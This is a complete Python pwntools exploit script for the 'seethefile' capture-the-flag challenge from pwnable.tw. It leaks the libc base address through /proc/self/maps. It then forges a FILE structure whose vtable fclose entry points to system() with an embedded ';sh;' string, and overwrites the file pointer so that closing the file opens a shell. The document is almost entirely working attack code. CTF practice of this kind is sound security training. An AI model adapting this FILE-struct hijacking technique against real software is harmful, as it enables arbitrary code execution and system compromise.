from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


class Offsets:
    SH_STR = 0x0
    VTABLE_FCLOSE = 0x8
    LOCK = 0x48
    VTABLE = 0x94


class Addresses:
    MAGICBUF = 0x0804B0C0
    NULL_AREA = MAGICBUF + 0x48 + 4


class Files:
    VMMAP_FILE = '/proc/self/maps'
    STDIN_FILE = '/proc/self/fd/0'


class Prompts:
    MENU = 'MENU'
    CHOICE = 'Your choice :'
    FILE_NAME = 'What do you want to see :'


class Choices:
    OPEN = '1'
    READ = '2'
    PRINT = '3'
    CLOSE = '4'
    EXIT = '5'


p = gdb.debug(
    seethefile.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)

# p = remote('chall.pwnable.tw', 10200)


def leak_libc_addr():
    libc_base_addr = None
    p.sendlineafter(Prompts.CHOICE, Choices.OPEN)
    p.sendlineafter(Prompts.FILE_NAME, Files.VMMAP_FILE)

    while not libc_base_addr:
        p.sendlineafter(Prompts.CHOICE, Choices.READ)
        p.sendlineafter(Prompts.CHOICE, Choices.PRINT)
        vmmap = p.recvuntil(Prompts.MENU).decode().splitlines()
        for mapping in vmmap:
            if mapping.endswith('libc_32.so.6') or mapping.endswith('libc-2.23.so'):
                libc_base_addr = int(mapping[:8], 16)
                break

    p.sendlineafter(Prompts.CHOICE, Choices.CLOSE)
    print(f'[*] libc base address: {hex(libc_base_addr)}')
    return libc_base_addr


def override_file_struct(system_addr):
    p.sendlineafter(Prompts.CHOICE, Choices.OPEN)
    p.sendlineafter(Prompts.FILE_NAME, Files.STDIN_FILE)
    p.sendlineafter(Prompts.CHOICE, Choices.READ)
    payload = b''

    print('[*] Placing "sh" on the buffer.')
    payload += b'\0' * Offsets.SH_STR + p32(0x01010101) + b';sh;'

    print('[*] Setting fclose custom function handler.')
    payload += b'\0' * (Offsets.VTABLE_FCLOSE -
                        Offsets.SH_STR - 8) + p32(system_addr)

    print('[*] Setting the FILE\'s lock member.')
    payload += b'\0' * (Offsets.LOCK - Offsets.VTABLE_FCLOSE -
                        4) + p32(Addresses.NULL_AREA)

    print('[*] Overriding the vtable of the FILE struct.')
    payload += b'\0' * (Offsets.VTABLE - Offsets.LOCK - 4) + \
        p32(Addresses.MAGICBUF)
    payload += b'\0' * 500
    p.sendline(payload)
    print('[*] Sent payload.')


def call_fclose():
    p.sendlineafter(Prompts.CHOICE, Choices.EXIT)
    print('[*] Overriding the file pointer.')
    p.sendline(b'A' * 0x20 + p32(Addresses.MAGICBUF))
    print('[*] Calling fclose on the corrupted FILE struct.')


def main():
    libc_base_addr = leak_libc_addr()
    override_file_struct(libc_base_addr + libc.symbols['system'])
    call_fclose()
    p.interactive()


if __name__ == "__main__":
    main()
